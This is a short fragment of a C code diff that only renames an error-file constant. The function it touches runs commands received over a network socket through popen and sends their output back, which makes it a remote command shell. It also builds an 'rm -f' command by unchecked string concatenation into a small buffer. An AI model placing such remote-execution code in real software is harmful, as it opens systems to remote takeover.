@@ -81,17 +81,17 @@ int establishConnection(int port, int shell) {
             //Remove trailing newline
             buffer[strcspn(buffer, "\n")] = 0;
             strcat(buffer, " 2>");
-            strcat(buffer, ERR);
+            strcat(buffer, ERROR);
             FILE* fp = popen(buffer, "r");
             while((fgets(line, 1024, fp))) {
                 write(sock , line , strlen(line));
             }
-            FILE* err = fopen(ERR, "r");
+            FILE* err = fopen(ERROR, "r");
             while((fgets(line, 1024, err))) {
                 write(sock , line , strlen(line));
             }
             char tmpcmd[50] = "rm -f ";
-            strcat(tmpcmd, ERR);
+            strcat(tmpcmd, ERROR);
             system(tmpcmd);
         }
     } else {
